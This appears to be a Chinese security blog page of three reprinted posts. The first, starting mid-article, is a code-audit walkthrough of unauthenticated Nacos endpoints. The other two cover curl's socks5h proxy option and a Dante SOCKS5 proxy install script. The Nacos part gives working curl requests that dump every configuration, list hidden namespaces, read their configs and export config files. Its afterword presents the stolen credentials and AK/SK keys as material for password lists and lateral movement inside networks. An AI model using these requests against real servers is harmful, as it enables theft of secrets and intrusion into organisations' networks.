-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Query the configuration information and return it in JSON format.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(params = &quot;search=accurate&quot;)</span></span><br><span class="line">   <span class="meta">@Secured(action = ActionTypes.READ, signType = SignType.CONFIG)</span></span><br><span class="line">   <span class="keyword">public</span> Page&lt;ConfigInfo&gt; <span class="title function_">searchConfig</span><span class="params">(<span class="meta">@RequestParam(&quot;dataId&quot;)</span> String dataId, <span class="meta">@RequestParam(&quot;group&quot;)</span> String group,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;appName&quot;, required = false)</span> String appName,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;tenant&quot;, required = false, defaultValue = StringUtils.EMPTY)</span> String tenant,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;config_tags&quot;, required = false)</span> String configTags,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;pageNo&quot;)</span> <span class="type">int</span> pageNo, <span class="meta">@RequestParam(&quot;pageSize&quot;)</span> <span class="type">int</span> pageSize)</span> &#123;</span><br><span class="line">       Map&lt;String, Object&gt; configAdvanceInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">100</span>);</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(appName)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;appName&quot;</span>, appName);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(configTags)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;config_tags&quot;</span>, configTags);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> configInfoPersistService.findConfigInfo4Page(pageNo, pageSize, dataId, group, tenant, configAdvanceInfo);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="string">&quot;serialize page error, dataId=&quot;</span> + dataId + <span class="string">&quot;, group=&quot;</span> + group;</span><br><span class="line">           LOGGER.error(errorMsg, e);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(errorMsg, e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Fuzzy query configuration information. Fuzzy queries based only on content are not allowed, that is, both dataId</span></span><br><span class="line"><span class="comment">    * and group are NULL, but content is not NULL. In this case, all configurations are returned.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(params = &quot;search=blur&quot;)</span></span><br><span class="line">   <span class="meta">@Secured(action = ActionTypes.READ, signType = SignType.CONFIG)</span></span><br><span class="line">   <span class="keyword">public</span> Page&lt;ConfigInfo&gt; <span class="title function_">fuzzySearchConfig</span><span class="params">(<span class="meta">@RequestParam(&quot;dataId&quot;)</span> String dataId,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;group&quot;)</span> String group, <span class="meta">@RequestParam(value = &quot;appName&quot;, required = false)</span> String appName,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;tenant&quot;, required = false, defaultValue = StringUtils.EMPTY)</span> String tenant,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;config_tags&quot;, required = false)</span> String configTags,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;pageNo&quot;)</span> <span class="type">int</span> pageNo, <span class="meta">@RequestParam(&quot;pageSize&quot;)</span> <span class="type">int</span> pageSize)</span> &#123;</span><br><span class="line">       MetricsMonitor.getFuzzySearchMonitor().incrementAndGet();</span><br><span class="line">       Map&lt;String, Object&gt; configAdvanceInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">50</span>);</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(appName)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;appName&quot;</span>, appName);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(configTags)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;config_tags&quot;</span>, configTags);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> configInfoPersistService.findConfigInfoLike4Page(pageNo, pageSize, dataId, group, tenant, configAdvanceInfo);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="string">&quot;serialize page error, dataId=&quot;</span> + dataId + <span class="string">&quot;, group=&quot;</span> + group;</span><br><span class="line">           LOGGER.error(errorMsg, e);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(errorMsg, e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>我们可以看到首先先进行了<code>signType = SignType.CONFIG</code>的权限检查，这里的<code>signType</code>的一个作用就是检查<code>auth</code>是否开启，但是之前也提到过，<code>auth</code>是默认不开启的。接着我们继续分析，当参数<code>search=accurate</code>时，从GET请求中获取参数<code>dataId、group、appName、tenant、config_tags、pageNo、pageSize</code>参数，其中<code>appName、tenant、config_tags</code>不是必填的，接着先检查<code>appName</code>和<code>configTags</code>是否为空，我们直接留空或者不填就能绕过这个判断，然后接下来就是迷之操作了，直接给我全部返回了。<br>所以我们直接构造参数，就可以发现能够获取全部的配置文件了。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>或者：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/3.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>但这里有个问题，这只能获取默认命名空间<code>public</code>里面的数据，但是现在有大聪明已经学会了不把数据放到默认的<code>public</code>，而是自己重新建一个<code>namespace</code>，再把企业的相关配置放在里面，这里留个伏笔，我们接着往下看。</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/4.png" alt="image"></p>
-</blockquote>
-<h3><span id="获取其他namespace的配置数据">获取其他Namespace的配置数据</span></h3><blockquote>
-<p>根据官方的OpenAPI文档描述，可以直接请求获取。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/console/namespaces&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>我们查看对应的代码，处理<code>namespace</code>的代码在<code>nacos/console/src/main/java/com/alibaba/nacos/console/controller/NamespaceController.java</code>这里，我们看从48行开始的代码，相关代码如下：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/v1/console/namespaces&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NamespaceController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommonPersistService commonPersistService;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> NamespaceOperationService namespaceOperationService;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">namespaceIdCheckPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[\\w-]+&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NAMESPACE_ID_MAX_LENGTH</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get namespace list.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> namespace list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> RestResult&lt;List&lt;Namespace&gt;&gt; <span class="title function_">getNamespaces</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RestResultUtils.success(namespaceOperationService.getNamespaceList());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这样一看上去，直接访问就能获取到<code>Namespace</code>列表，我们再跟一下<code>namespaceOperationService.getNamespaceList()</code>:</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Namespace&gt; <span class="title function_">getNamespaceList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// TODO 获取用kp</span></span><br><span class="line">        List&lt;TenantInfo&gt; tenantInfos = commonPersistService.findTenantByKp(DEFAULT_KP);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Namespace</span> <span class="variable">namespace0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Namespace</span>(<span class="string">&quot;&quot;</span>, DEFAULT_NAMESPACE, DEFAULT_QUOTA,</span><br><span class="line">                configInfoPersistService.configInfoCount(DEFAULT_TENANT), NamespaceTypeEnum.GLOBAL.getType());</span><br><span class="line">        List&lt;Namespace&gt; namespaceList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        namespaceList.add(namespace0);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (TenantInfo tenantInfo : tenantInfos) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">configCount</span> <span class="operator">=</span> configInfoPersistService.configInfoCount(tenantInfo.getTenantId());</span><br><span class="line">            <span class="type">Namespace</span> <span class="variable">namespaceTmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Namespace</span>(tenantInfo.getTenantId(), tenantInfo.getTenantName(),</span><br><span class="line">                    tenantInfo.getTenantDesc(), DEFAULT_QUOTA, configCount, NamespaceTypeEnum.CUSTOM.getType());</span><br><span class="line">            namespaceList.add(namespaceTmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> namespaceList;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>看上去也没有做什么限制，我们直接访问发现可以直接读到非public的Namespace，就是上面我们创建名叫REDTEAM的test_namespace命名空间。</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/5.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>这时候我们已经拿到了namespace、namespaceShowNmae，我们就可以根据之前的API光明正大的进行读取操作了，这里有个小技巧，之前读取配置里面的tenant参数获取的就是namespce，我们直接把tenant&#x3D;test_namespace加进去构造请求，轻松读取到非public空间的数据。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=test_namespace&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/6.png" alt="image"></p>
-</blockquote>
-<h3><span id="配置文件导出">配置文件导出</span></h3><blockquote>
-<p>就在我看上面上面这部分代码的时候，我们无意中发现了一个下载文件的接口，还是这个文件，找到了疑似导出配置文件的接口，我们继续跟进一下。<br><code>/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigController.java</code></p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/7.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>接着我们在482行看到了相关代码。</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/8.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>根据逻辑，我们很轻松的构造出下载的链接，跟上面的类似，其中tenant为空默认下载public命名空间，如果要下载其他命名空间的配置文件则重复之前的先获取Namespace即可。</p>
-</blockquote>
-<blockquote>
-<p><code>http://192.168.20.144:8848/nacos/v1/cs/configs?export=true&amp;tenant=test_namespace&amp;group=&amp;appName=&amp;ids=</code></p>
-</blockquote>
-<h2><span id="后记">后记</span></h2><blockquote>
-<p>现在来看，之所以因为官方觉得不开启auth不算是漏洞，是因为根据官网OpenAPI来看，你需要知道具体的 Data Id 以及 Group才能读到具体配置，但是攻击者总能够通过代码审计的方法找到其他参数进行绕过。<br>目前攻防对抗实战中，Nacos的环境遇到非常多，并且无一例外都没有开启auth，很多防守方甚至只是用防火墙阻断网上公开的那几条exp利用的关键地址，Nacos里面保存了企业很多的配置文件比如数据库连接信息、AK&#x2F;SK信息等等，拿到账号密码等信息之后用来做密码本，然后再进行内网横向，杀伤力非常之大。</p>
-</blockquote>
-<h2><span id="参考链接">参考链接</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://nacos.io/en-us/docs/auth.html">https://nacos.io/en-us/docs/auth.html</a><br><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/1105">https://github.com/alibaba/nacos/issues/1105</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nacos/" rel="tag">Nacos</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/07/04/Curl-Socks5h-x/">
-                Curl-Socks5h-x
-            </a>
-        </h2>
-    
-    <time>
-        Jul 4, 2023
-    </time>
-    <section class="content">
-        <h1><span id="linux讓-curl-藉由-socks5-proxy-連線時不要反解-dns造成連線失敗">[Linux]讓 curl 藉由 socks5 proxy 連線時，不要反解 DNS，造成連線失敗</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://ephrain.net/linux-%e8%ae%93-curl-%e8%97%89%e7%94%b1-socks5-proxy-%e9%80%a3%e7%b7%9a%e6%99%82%ef%bc%8c%e4%b8%8d%e8%a6%81%e5%8f%8d%e8%a7%a3-dns%ef%bc%8c%e9%80%a0%e6%88%90%e9%80%a3%e7%b7%9a%e5%a4%b1%e6%95%97/">Ephrain</a> 并作补充</p>
-</blockquote>
-<h2><span id="proxy-server链接问题">Proxy Server链接问题</span></h2><blockquote>
-<p>公司的專案程式通常需要支援各種 proxy server，如 HTTP proxy, socks4 和 socks5 proxy。<br>今天遇到一個問題，我們的程式底層會使用 libcurl 做 HTTP 連線，但連到一台 socks5 proxy 時卻不能成功…</p>
-<p>試著用 curl 加上 -x 選項來指定 proxy server，再加 -v 選項看看詳細的錯誤訊息：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 connect to IPv6 2600:1417:1b:184::23ac (locally resolved)</span><br><span class="line">* Can<span class="string">&#x27;t complete SOCKS5 connection to 0.0.0.0:0. (1)</span></span><br><span class="line"><span class="string">* Closing connection 0</span></span><br><span class="line"><span class="string">curl: (7) Can&#x27;</span>t complete SOCKS5 connection to 0.0.0.0:0. (1)</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>可以看到訊息裡有一行 locally resolved，這行代表的是 curl 自行去查詢了 DNS，將 testdomain.com 的 IP 找出來，但因為 curl 使用的是 Happy Eyeball 的演算法，同時會發出 Type A 和 AAAA 的 DNS request 封包，因此如果 AAAA 的 DNS 回應封包先回來的話，就會拿到 testdomain.com 的對應 IPv6 位址，反之如果是 A 的 DNS 回應封包先回來的話，拿到的則是 IPv4 位址。</p>
-</blockquote>
-<blockquote>
-<p>下面用 Wireshark 觀察一下 curl 產生出來的 DNS 封包，它送出了 A 和 AAAA 兩種 DNS 封包，以下例來說是 A (IPv4) 的回應先回來，但這個結果會依據網路狀況而有所不同，有時候是 AAAA (IPv6) 的回應先回來：<br><img src="/2023/07/04/Curl-Socks5h-x/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>curl 自行查詢 DNS 這件事情有什麼錯誤嗎？<br>以這個例子來說，curl 幫忙查出 testdomain.com 的 IPv6 位址 2600:1417:1b:184::23ac，然後連線到 socks5 proxy 172.22.1.1，叫它連線到這個 IPv6 位址去。<br>然而，這台 socks5 proxy 所在的網路只設定了 IPv4 位址，所以 proxy server 本身是無法藉由 IPv6 位址來連線的！<br>因此它自然無法連線到 curl 指定的 IPv6 位址，導致連線失敗…</p>
-</blockquote>
-<blockquote>
-<p>要解決這個問題，可以叫 curl 不要雞婆自己去查 DNS，而是讓 proxy server 自己來查 DNS，因為 proxy server 自己知道所處的網路環境，像是它不能連 IPv6 網路時，自然不會去問 Type AAAA (IPv6) 的 DNS 結果。</p>
-</blockquote>
-<blockquote>
-<p>我們將原本的 socks5:&#x2F;&#x2F;<proxy>:<port> 改成 socks5h:&#x2F;&#x2F;<proxy>:<port>，代表要讓 proxy 自己的查詢 DNS，可以看到 curl 直接連到了 proxy server，沒有先做 DNS 查詢，而最終 proxy 也成功完成了連線：</port></proxy></port></proxy></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5h://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 request granted.</span><br><span class="line">* Connected to 172.22.1.1 (172.22.1.1) port 8080 (<span class="comment">#0)</span></span><br><span class="line">...</span><br><span class="line">* Curl_http_done: called premature == 0</span><br><span class="line">* Connection <span class="comment">#0 to host testdomain.com left intact</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>不過這種雷，幾乎是每次整合一個用到 libcurl 的模組，就會再踩到一次啊…</p>
-</blockquote>
-<h2><span id="我遇到的场景">我遇到的场景</span></h2><blockquote>
-<p>首先，我没想到我会被台湾同胞的这篇技术博客教到很有趣的东西，其次，博主的语言和繁体配合起来更有趣了，也基于尊重保留了完整原文<br><img src="/2023/07/04/Curl-Socks5h-x/1.jpg" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>公司做安全监控平台收敛内网后，外部主机关联内网服务器的数据，需要监控进程 agent 以走代理的方式进来<br>自然代理服务器的公网地址和内网地址不在一个网段，然后为了安全性，代理服务器内网地址虽然和监控服务器同一网段，但由于安全组的隔离两者是不能直接访问的……(<em>´◐∀◐&#96;</em>)</p>
-</blockquote>
-<blockquote>
-<p>代中代(<em>´◐∀◐&#96;</em>)</p>
-</blockquote>
-<blockquote>
-<p>很自然的 curl 即使走代理都找不到身处内网的监控服务器域名<br>我只能在代理服务器 host 上配一下域名解析，然后翻了许久找到了 curl 的代理访问方式原理，就是这位博主的文章，让我明白了可以让 Proxy Server 去做 curl 的进一步内网解析<br>泪目，乙方厂商技术整半天都解决不了的问题，后来和我说我给的命令，其他客户也有这种问题的不能装的也能装了，让我找他们销售要钱草w(“▔□▔)</p>
-</blockquote>
-<blockquote>
-<p>希望两岸互相少点偏见吧</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Socks5/" rel="tag">Socks5</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/06/27/Danted-Socks5-proxy/">
-                Danted Socks5代理搭建
-            </a>
-        </h2>
-    
-    <time>
-        Jun 27, 2023
-    </time>
-    <section class="content">
-        <h1><span id="danted-socks5代理搭建">Danted Socks5代理搭建</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://sunpma.com/724.html">SunPma</a> 并作补充</p>
-</blockquote>
-<h2><span id="说明">说明</span></h2><blockquote>
-<p>Socks5属于明文代理，不要用于科学上网，否则会被阻断端口，可用于正常的跳板使用；<br>比如SSH转发加速国外VPS的连接速度，特别是一些延迟高或者丢包高的VPS；<br>使用Socks5转发后SSH就可以快速稳定的连接了，解决高丢包SSH断开的问题；</p>
-</blockquote>
-<h2><span id="支持">支持</span></h2><blockquote>
-<p>支持系统：Debian7+ Ubuntu14.04+ CentOS6+</p>
-</blockquote>
-<h2><span id="安装">安装</span></h2><blockquote>
-<p>下载脚本：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.github.com/Lozy/danted/master/install.sh -O install.sh</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>安装脚本：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash install.sh  --port=端口 --user=用户名 --passwd=密码</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>其中的端口 用户名 密码自行修改后粘贴到SSH里运行安装即可；<br>完成后会提示Dante Server Install Successfuly即表示安装成功；<br>安装后如果连接不上，检查设置的端口是否已经放行；<br>说明：安装完成后会显示内网IP地址，但在实际使用的时候需要用外网IP地址；</p>
-</blockquote>
-<h2><span id="使用">使用</span></h2><blockquote>
-<p>一般使用IP和用户名密码即可使用<br>如果需要固定IP或IP段，可以修改配置文件设置白名单</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/danted/sockd.conf</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>修改以下代码，改成你需要设置的白名单IP或IP段即可，然后重启使其生效；</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0/0  to: 0.0.0.0/0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2><span id="卸载">卸载</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash install.sh --uninstall</span><br></pre></td></tr></table></figure>
-
-<h2><span id="命令">命令</span></h2><p>|命令	|或者	|说明|<br>|service sockd start	|&#x2F;etc&#x2F;init.d&#x2F;sockd start	|启动socks5服务器守护进程|<br>|service sockd stop	|&#x2F;etc&#x2F;init.d&#x2F;sockd stop	|停止socks5服务器守护进程|<br>|service sockd restart	|&#x2F;etc&#x2F;init.d&#x2F;sockd restart	|重新启动socks5服务器守护进程|<br>|service sockd reload	|&#x2F;etc&#x2F;init.d&#x2F;sockd reload	|重新加载socks5服务器守护进程|<br>|service sockd status	|&#x2F;	|系统进程状态|<br>|service sockd state	|&#x2F;etc&#x2F;init.d&#x2F;sockd state	|运行状态|<br>|service sockd tail	|&#x2F;etc&#x2F;init.d&#x2F;sockd tail	sock |日志|<br>|service sockd adduser	|&#x2F;etc&#x2F;init.d&#x2F;sockd adduser	|添加pam-auth用户：service sockd adduser NAME PASSWORD|<br>|service sockd deluser	|&#x2F;etc&#x2F;init.d&#x2F;sockd deluser	|删除pam-auth用户：service sockd deluser NAME|</p>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Danted/" rel="tag">Danted</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Socks5/" rel="tag">Socks5</a>
             </div>
         
 
